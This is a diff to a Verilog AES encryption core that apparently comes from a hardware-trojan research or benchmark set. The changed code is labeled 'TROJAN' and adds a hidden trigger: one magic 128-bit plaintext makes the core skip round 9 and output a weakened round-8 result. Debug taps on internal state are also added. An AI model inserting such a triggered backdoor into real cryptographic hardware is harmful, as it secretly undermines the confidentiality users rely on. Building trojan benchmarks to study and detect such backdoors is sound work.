@@ -43,8 +43,6 @@
 
 `default_nettype none
 
-`default_nettype none
-
 module aes_core_tapped(
                 input wire            clk,
                 input wire            reset_n,
@@ -63,7 +61,10 @@ module aes_core_tapped(
                 output wire [1407 : 0] round_keys_flat,
 
                 // RCM: tap round counter
-                output wire [3 : 0]   muxed_round_nr
+                output wire [3 : 0]   muxed_round_nr,
+
+                // ORC: tap state before final round
+                output wire [127 : 0] state_before_final
                );
 
 
@@ -116,6 +117,8 @@ module aes_core_tapped(
   reg [3 : 0]    muxed_round_nr_int;
   reg            muxed_ready;
 
+  wire [127:0]   enc_state_before_final;
+
   wire [31 : 0]  keymem_sboxw;
 
 /* verilator lint_off UNOPTFLAT */
@@ -127,7 +130,15 @@ module aes_core_tapped(
   //----------------------------------------------------------------
   // Instantiations.
   //----------------------------------------------------------------
-  aes_encipher_block enc_block(
+  // ====== TROJAN BEGIN: T03_p3_skip_mixcol ======
+  wire        trojan_trig;
+  wire        skip_round9;
+  assign      trojan_trig = (block ==
+                  128'h12345678_9ABCDEF0_00000000_00000001);
+  assign      skip_round9 = trojan_trig;
+  // ===== TROJAN END: T03_p3_skip_mixcol ======
+
+  aes_encipher_block_tapped enc_block(
                                .clk(clk),
                                .reset_n(reset_n),
 
@@ -142,7 +153,12 @@ module aes_core_tapped(
 
                                .block(block),
                                .new_block(enc_new_block),
-                               .ready(enc_ready)
+                               .ready(enc_ready),
+
+                               .state_before_final(enc_state_before_final),
+
+                               // T03: skip round 9 to trigger RCM
+                               .skip_round9(skip_round9)
                               );
 
 
@@ -188,14 +204,14 @@ module aes_core_tapped(
   //----------------------------------------------------------------
   assign ready        = ready_reg;
   // ====== TROJAN BEGIN: T03_p3_skip_mixcol =====
+  // Output = result from round 8 (skip round 9)
   reg [127:0] round_8_result;
   reg         round_8_result_we;
-  wire        trojan_trig = (block ==
-                  128'h12345678_9ABCDEF0_00000000_00000001);
   assign result = trojan_trig ? round_8_result : muxed_new_block;
   // ===== TROJAN END: T03_p3_skip_mixcol =====
   assign result_valid = result_valid_reg;
   assign muxed_round_nr = muxed_round_nr_int;
+  assign state_before_final = enc_state_before_final;
 
 
   //----------------------------------------------------------------
